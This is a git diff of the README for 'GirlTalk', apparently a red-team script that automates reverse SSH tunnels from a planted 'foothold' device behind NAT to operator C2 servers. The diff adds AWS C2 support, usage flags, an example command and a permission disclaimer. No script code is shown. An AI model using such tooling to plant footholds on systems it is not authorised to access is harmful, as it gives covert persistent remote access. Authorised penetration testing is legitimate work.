@@ -6,27 +6,41 @@ GirlTalk is a script for rapidly deploying reverse SSH tunnels to remotely posit
 ### Updates ###
 * Added multi-user support
 * Scripting options to allow fine-tuning & easier operation
+* Girltalk now supports AWS C2 deployments with the -a option
 
 ### NOTE! ###
-This script does not work cleanly with AWS ssh keys (yet).
+This tool is freely licensed but I do not take any responsibility for whatever you choose to do with this.
+Therefore, only use this tool in association with systems and networks you have explicit permission to operate on!
 
 ### What is this repository for? ###
 
 GirlTalk does not use any specialized tools, and utilizes the native functionality of OpenSSH to allow remotely positioned devices to connect back to operator-owned C2
-infrastructure. This removes any ambiguity about connecting to infrastructure where a route is not easily accessible, such as when a device needs to be accessible behind 
+infrastructure. This removes any ambiguity about connecting to infrastructure where a route is not easily accessible, such as when a device needs to be accessible behind
 Network Address Translation (NAT).
 
+### USAGE ###
+Girltalk is currently compatible with the followin options:
+Key/Cert Mode options:
+  -a	Boolean option for keyed C2 infrastructure.
+  -k    Full path of SSH key.
+
+Password Mode options:
+  -c    C2 host.
+  -u	C2 username.
+  -l    Local username to use.
+
+usage:	 girltalk.sh -c <C2 hostname/IP> -l <local_username> -u <C2_username>
+example: girltalk.sh -c host.aws.com -u ubuntu -l hatchetface -a -k ~/.ssh/amazon-keypair.pem
+
 ### How does it work? ###
-Girltalk takes advantage of the standard functionality of openssh, but scripts out the process of orchestrating the connection between the "foothold" host to be deployed behind 
+Girltalk takes advantage of the standard functionality of openssh, but scripts out the process of orchestrating the connection between the "foothold" host to be deployed behind
 NAT and the "C2" operators have easy ssh access through.
 ![example diagram](/images/diagram.png)
 
 ### How do I get set up? ###
 Prior to running girltalk.sh, operators should have a domain name at hand to give to the script to enable the host to access it once it has been put into the NAT'd environment.
 The easiest way to enable this is to create a dynDNS domain, and have the domain point to the infrastructure the operators intend to use.
-
-PLEASE NOTE!
-At this time, the best way to use this script is to ensure that the C2 is available when the script is first run so that the hmu.sh file can be successfully transferred. This
+The best way to use this script is to ensure that the C2 is available when the script is first run so that the hmu.sh file can be successfully transferred. This
 functionality may change in a future release, but girltalk was build with this usecase in mind.
 
 GirlTalk is a simple script that automates the reverse SSH tunnel setup process. The script has been developed and tested in Debian derivative environments, but can easily be
@@ -46,15 +60,11 @@ When girltalk.sh is done, a new script will be made available in the root direct
 the account specified during girltalk runtime and you should have a shell on the remotely deployed foothold host without needing any unknown routing information from the foothold
 host!
 
-### Future features ###
-Support for GirlTalk will include the following roadmap:
-* Add support for new methods of reverse ssh (autossh)
+### Feature Roadmap ###
+* Add support for new methods of reverse ssh (autossh) - Next up!
 * Added user versatility
 * Keysize customization
-* More robust DynDNS handling
-* RDP handling
-** disable local SSH server 
-* Stability upgrades (currently in development!)
+* RDP handling 
 * multi-foothold handling
 * Stability upgrades
 * multi-foothold handling (Look out for news on ChurchInTheWild..coming soon!)
